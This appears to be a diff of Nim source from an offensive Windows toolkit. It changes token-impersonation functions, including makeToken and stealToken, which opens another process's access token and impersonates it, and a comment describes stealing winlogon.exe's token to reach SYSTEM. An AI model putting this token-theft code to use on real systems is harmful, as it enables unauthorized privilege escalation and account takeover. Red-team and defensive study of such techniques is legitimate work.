@@ -104,7 +104,7 @@ proc privilegeToString(luid: PLUID): string =
 #[
     Retrieve and return information about an access token
 ]#
-proc getTokenStatistics(hToken: HANDLE, apis: Apis = initApis()): tuple[tokenId, tokenType: string] = 
+proc getTokenStatistics*(hToken: HANDLE, apis: Apis = initApis()): tuple[tokenId, tokenType: string] = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
@@ -294,7 +294,7 @@ proc rev2self*() =
     Using other logon types (https://learn.microsoft.com/en-us/windows-server/identity/securing-privileged-access/reference-tools-logon-types) 
     changes the output of the getTokenOwner function. The credentials are then validated by the LogonUserA function. 
 ]#
-proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS): string = 
+proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_LOGON_NEW_CREDENTIALS): HANDLE = 
     let apis = initApis()
     
     if username == "" or password == "" or domain == "": 
@@ -306,11 +306,10 @@ proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_L
     let provider: DWORD = if logonType == LOGON32_LOGON_NEW_CREDENTIALS: LOGON32_PROVIDER_WINNT50 else: LOGON32_PROVIDER_DEFAULT
     if LogonUserA(username, domain, password, logonType, provider, addr hToken) == FALSE:
         raise newException(CatchableError, GetLastError().getError())
-    defer: discard apis.NtClose(hToken)
-    
+
     impersonate(hToken, apis)
 
-    return getTokenUser(hToken, apis).username
+    return hToken
 
 proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
     let apis = initApis()
@@ -345,7 +344,7 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
     This requires SYSTEM privileges to work reliably. Even running as a regular Administrator user might not be sufficient to steal access tokens of other processes
     A work-around is to impersonate NT AUTHORITY\SYSTEM first by stealing the token of a process like winlogon.exe, and then using this token to steal other user's tokens 
 ]#
-proc stealToken*(pid: int): string = 
+proc stealToken*(pid: int): HANDLE = 
     let apis = initApis() 
     
     var 
@@ -371,10 +370,9 @@ proc stealToken*(pid: int): string =
 
     # Open a handle to the primary access token of the target process
     status = apis.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, addr hToken)
-    if status != STATUS_SUCCESS: 
+    if status != STATUS_SUCCESS:
         raise newException(CatchableError, status.getNtError())
-    defer: discard apis.NtClose(hToken)
 
     impersonate(hToken, apis)
 
-    return getTokenUser(hToken, apis).username
+    return hToken
